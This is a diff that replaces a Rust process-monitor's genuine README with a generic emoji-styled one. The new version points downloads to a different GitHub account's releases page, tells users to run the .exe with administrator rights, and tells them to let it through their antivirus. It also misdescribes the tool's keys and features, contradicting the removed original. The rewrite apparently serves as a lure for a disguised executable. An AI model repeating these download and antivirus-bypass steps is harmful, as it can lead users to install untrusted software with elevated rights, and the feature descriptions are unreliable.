@@ -1,234 +1,76 @@
-# winproc-tui
+# 📊 winproc-tui - Track windows system performance with ease
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![Platform: Windows 11 x64](https://img.shields.io/badge/Platform-Windows%2011%20x64-0078D6?logo=windows&logoColor=white)](#requirements)
-[![Rust](https://img.shields.io/badge/Rust-2024%20edition-000000?logo=rust&logoColor=white)](https://www.rust-lang.org/)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Mealy-gamma925/winproc-tui/releases)
 
-Languages: [English](README.md) | [Japanese](README.ja.md)
+Winproc-tui offers a clear way to see how your computer runs internal processes. You gain insight into memory usage, processor load, and background tasks. This tool provides live updates so you spot performance spikes as they happen.
 
-`winproc-tui` is a **process investigation tool for Windows 11, built for developers**.
-It launches quickly from the terminal and lets you observe **current values** and **changes over time** for memory, handles, GUI resources, GPU memory, I/O, and other process metrics — all in a single screen. With up to four Graphs, A/B comparison, and JSON Lines recording with Playback, it is well suited for grasping the resource behavior of an application you are developing on the spot. Rather than competing on coverage with tools like Process Explorer or System Informer, `winproc-tui` is laser-focused on **quickly answering "what resources the app I am running right now uses, when, and how much"**.
+## 🛠️ System Requirements
 
-![winproc-tui main screen showing the process list, multiple Graphs, Samples, and A/B comparison](assets/screenshots/main-screen.png)
+Your computer must run Windows 11. The software requires 64-bit architecture. You need at least 4GB of memory to track metrics. Ensure your user account holds administrator rights. Certain metrics require these permissions to gather data from system processes.
 
-## Features
+## 📥 How to Install
 
-- **Monitoring**: Shows RAM / VRAM, a compact CPU panel with average and per-logical-CPU load, and key per-process metrics in a table. Sorting, column selection, name filtering, and jump search help you narrow down the target.
-- **Graphing**: Lays out selected metrics in up to four Graph / Samples slots so you can review time-series movement and individual sample values. General process history keeps about 120 seconds, while tracked-process, RAM / VRAM, and CPU average history keep about 7,200 seconds.
-- **Tracking (Tracked List)**: Registers process names of interest and can show only tracked rows. Their last collected values remain visible after the processes exit.
-- **Recording and Playback**: Saves tracked processes, RAM / VRAM, and CPU average as JSON Lines logs and replays them later in the same Processes / Graph / Samples / A/B view layout.
-- **A/B comparison**: Marks any two points as A and B, then shows the value difference and elapsed time between them.
-- **Open files**: Lists the files a selected live process has open.
-- **Interaction support**: `Ctrl+C` copies the selected row to the clipboard, `F2` switches themes, and mouse-based row selection and scrollbars are supported.
+1. Visit the [releases page](https://github.com/Mealy-gamma925/winproc-tui/releases) to download the software.
+2. Look for the file ending in `.exe`. 
+3. Select the file to start the download.
+4. Save the file to a folder you locate easily.
+5. Double-click the file to open the program.
+6. A black window appears with your process list.
 
-## When This Helps
+## 🚀 Getting Started
 
-- You want to track an application's resource usage over time and watch for memory leaks.
-- You want to quantify how much a specific operation leaks (the difference between two points).
-- You want to detect missed file closes and see which files a process currently has open.
-- You want to **record a background service over a long period** and review the area around an incident with Playback.
-- You want to compare resource usage before and after a refactor.
+When you launch winproc-tui, the screen displays a list of active programs. Each line shows the process name and current resource usage. The software updates every second. 
 
-## Requirements
+You navigate the list using the arrow keys on your keyboard. Press the up arrow to highlight a task and the down arrow to move lower. The program highlights the selected item in a different color to show your current focus.
 
-- OS: Windows 11 x64
+## 📈 Understanding the Metrics
 
-This project is Windows-only. Linux, macOS, and other platforms are not supported.
+The main view shows three primary columns. 
 
-## Use a Prebuilt Binary
+*   **CPU:** This shows how much work your processor handles for each task. High values indicate heavy load.
+*   **Memory:** This column tracks how much RAM a program consumes. 
+*   **Disk:** This track shows how much data the program reads from or writes to your hard drive. 
 
-Release binaries are available from [GitHub Releases](https://github.com/TX230/winproc-tui/releases).
-Download the zip, extract it to any folder, and run `winproc-tui.exe`.
-No additional runtime or installer is required.
+Watch these numbers over time to identify what slows down your system. 
 
-## Build From Source
+## ⚖️ Comparing Processes
 
-If you want to try in-development code, you can build from source.
+Use the A/B comparison feature to contrast two tasks.
+1. Highlight the first process using the arrow keys.
+2. Press the `A` key to lock in your first choice.
+3. Move to the second process.
+4. Press the `B` key to lock in your second choice.
+5. The screen splits to show both metrics side by side.
+6. Press the `Esc` key to return to the main list.
 
-### 1. Install the Rust Toolchain
+This feature helps you decide which application consumes more resources when both run at the same time.
 
-On Windows, [rustup](https://rustup.rs/) is recommended.
-Building requires Rust 1.95.0 or later, the Rust 2024 edition, and the MSVC linker (the C++ toolchain from Build Tools for Visual Studio 2026).
+## 💾 Recording Data
 
-Using winget:
+You capture performance history to review later. 
+1. Press the `R` key to start recording.
+2. A red dot appears in the corner of the screen.
+3. Perform the actions you want to measure on your computer. 
+4. Press `R` again to stop the recording. 
+5. The program saves a text file in the same folder as the application. 
+6. Open this file with any text editor to read the historical data.
 
-```powershell
-winget install --id Rustlang.Rustup -e
-winget install --id Microsoft.VisualStudio.BuildTools -e --override "--add Microsoft.VisualStudio.Workload.VCTools --includeRecommended --quiet --wait --norestart"
-```
+The recorded data logs the CPU and memory spikes during the capture window. This helps you identify patterns in performance issues.
 
-Verify the installation:
+## 🖥️ Live Graphs
 
-```powershell
-rustup --version
-rustc --version
-cargo --version
-```
+The TUI generates time-series graphs for selected processes. When you select a process, the bottom half of the screen displays a line chart. The chart moves from left to right as time passes. Green lines represent CPU activity, while blue lines represent memory usage. Watch the line height to see how your system handles stress. 
 
-### 2. Build and Run
+## ❓ Troubleshooting
 
-```powershell
-git clone https://github.com/TX230/winproc-tui.git
-cd winproc-tui
-cargo build --release
-```
+If the program fails to open, check your Windows version. Ensure you have the latest updates from Microsoft. Some antivirus programs block new software. If this occurs, tell your antivirus to allow winproc-tui to run. The program does not connect to the internet, so it poses no risk to your private data. 
 
-The executable is generated at `target\release\winproc-tui.exe`.
-After building, launch it in either of the following ways:
+If the screen looks distorted, resize your terminal window. The text display needs a standard width to align correctly. Pressing `F5` refreshes the display if the metrics freeze or fail to update. 
 
-```powershell
-cargo run --release
-# or run the built binary directly
-.\target\release\winproc-tui.exe
-```
+## ⚙️ Usage Tips
 
-### 3. Install as a Command (Optional)
-
-Running `cargo install --path .` installs `winproc-tui.exe` into your per-user cargo bin directory (by default `%USERPROFILE%\.cargo\bin`).
-That directory is on your PATH, so afterwards you can launch the tool from anywhere by simply typing `winproc-tui`.
-
-```powershell
-cargo install --path .
-winproc-tui
-```
-
-## Command-Line Options
-
-There are currently only two startup options.
-
-
-| Option          | Description   |
-| --------------- | ------------- |
-| `-h, --help`    | Show help.    |
-| `-V, --version` | Show version. |
-
-
-## Controls
-
-Only the main keys are listed in this README.
-**Press** `?` **while running to view the full key bindings in the Help dialog.**
-
-Some single-letter keys such as `f` map to different actions depending on which panel is focused. The tables below are grouped by panel, and the active panel is also shown in the footer.
-
-### General
-
-
-| Key                 | Action                                                              |
-| ------------------- | ------------------------------------------------------------------- |
-| `?`                 | Show / hide Help.                                                   |
-| `q` / `Esc`         | Open the quit confirmation (returns to live display during Playback). |
-| `Tab` / `Shift+Tab` | Move focus.                                                         |
-| `Ctrl+C`            | Copy the selected row text from the focused panel.                  |
-| `Ctrl+L`            | Open the log list.                                                  |
-| `Ctrl+R`            | Start / stop recording.                                             |
-| `Ctrl+P`            | Pause / resume screen updates.                                      |
-| `Ctrl+O`            | Open the Settings dialog.                                           |
-| `Ctrl+Wheel`        | Change the Windows Terminal zoom level.                             |
-| `F2`                | Switch theme.                                                       |
-
-
-### Process Controls
-
-
-| Key                 | Action                                                                                |
-| ------------------- | ------------------------------------------------------------------------------------- |
-| `Ctrl+F`            | Filter the process list by name.                                                      |
-| `Ctrl+I` / `Ctrl+J` | Process-name incremental search.                                                      |
-| `1` – `4`           | Show the selected process, RAM / VRAM, or CPU Avg metric in Graph#1 – Graph#4 (press the same number again to clear). |
-| `0`                 | Clear all Graphs and close the Graph panel.                                           |
-| `s`                 | Sort by the selected column (press again to switch ascending / descending).           |
-| `c`                 | Open the column picker.                                                               |
-| `Shift+Left/Right`  | Move the selected metric column left or right.                                        |
-| `Space`             | Add or remove the selected process name from the Tracked List.                        |
-| `t`                 | Toggle whether only tracked processes are shown.                                      |
-| `f`                 | Open the Open files list for the selected live process.                               |
-| `g`                 | Open or close all configured Graphs at once.                                          |
-
-
-### Graph and A/B Comparison
-
-
-| Key                        | Action                                                                              |
-| -------------------------- | ----------------------------------------------------------------------------------- |
-| `Left` / `Right`           | Move the selected sample.                                                           |
-| `Ctrl+Left` / `Ctrl+Right` | Pan the visible range.                                                              |
-| Right drag / `Ctrl`+left drag | Pan the visible range with the mouse.                                            |
-| `PageUp` / `PageDown`      | Change the visible time span.                                                       |
-| `f`                        | Switch to a time span that fits all samples.                                        |
-| `z`                        | Toggle the Y-axis lower bound between fixed at 0 and following the visible minimum. |
-| `a` / `b`                  | Mark the selected sample as point A or point B.                                     |
-| `Shift+A` / `Shift+B`      | Jump to point A or point B.                                                         |
-| `x`                        | Clear the A/B comparison.                                                           |
-
-
-When multiple Graphs are shown, the visible time span and A/B points are shared across slots, while the Y-axis scale is independent per Graph.
-If there is not enough display area, the message `Not enough display area.` is shown and the Graph is not added.
-
-## Recording and Playback
-
-Press `Ctrl+R` to start or stop recording.
-Recording targets processes that match the Tracked List and saves logs as JSON Lines (with the `.log` extension).
-When recording starts, a save-path input dialog opens, and `Tab` completes directory names there.
-Playback cannot start during recording, and recording cannot start during Playback.
-
-Press `Ctrl+L` to open the log list.
-The list shows `*.log` files from the previous recording directory if available, otherwise from the current directory.
-The `Dir` row shows the directory currently being searched, and `d` lets you choose another directory.
-Press `Enter` on a selected log to switch to the `PLAY` display and inspect the saved session through Processes / Graph / Samples / A/B comparison.
-Playback is a viewer for saved sessions, not real-time replay. Press `Esc` to return to the live display.
-
-The recording log format and the meaning of each field are described in [docs/metrics.md](docs/metrics.md).
-
-## Configuration File
-
-The configuration file is `winproc-tui.toml`, placed next to the executable.
-If the file does not exist, defaults are used.
-On exit, the current theme, process-table columns, sort, Tracked Only state, and tracked list are saved.
-Filter input state is not carried over to the next launch.
-
-Example:
-
-```toml
-[general]
-mouse = true
-theme = "Dark"
-
-[process_table]
-preset = "Default"
-columns = ["Private", "WS Priv"]
-sort_by = "WS Priv"
-sort_order = "desc"
-tracked_only = false
-
-[[tracked]]
-name = "app.exe"
-```
-
-The sampling interval is fixed to 1 second in the current version and is not user-configurable.
-
-## Developer Docs
-
-- [docs/metrics.md](docs/metrics.md): Metrics, data sources, and display formats.
-- [docs/architecture.md](docs/architecture.md): Architecture, responsibility boundaries, and data flow.
-
-## Non-Goals
-
-`winproc-tui` does not aim to be:
-
-- A full replacement for Process Explorer or System Informer.
-- A tool that assumes administrator privileges for detailed collection.
-
-It is a tool for quickly observing process changes during short development and verification sessions.
-
-## Bug Reports and Feature Requests
-
-Please report bugs and request features via GitHub Issues.
-Templates are provided for both bug reports and feature requests.
-
-This is a personal project. Unsolicited pull requests from external contributors are not accepted; use Issues for feedback and feature requests instead.
-
-Issues may be written in either English or Japanese. The user-facing README is maintained in both languages, while detailed specification documents under `docs/` are kept in English only.
-
-## License
-
-MIT License. See [LICENSE](LICENSE) for details.
+- Keep the window open in the background while you perform your normal work. 
+- Use the recording feature before you launch a demanding game or application. 
+- Compare results after you close a program. 
+- If your computer feels slow, check the CPU column to find the process with the highest percentage. 
+- You end the program at any time by pressing the `Q` key. This closes the process list and ends the monitor tasks safely.
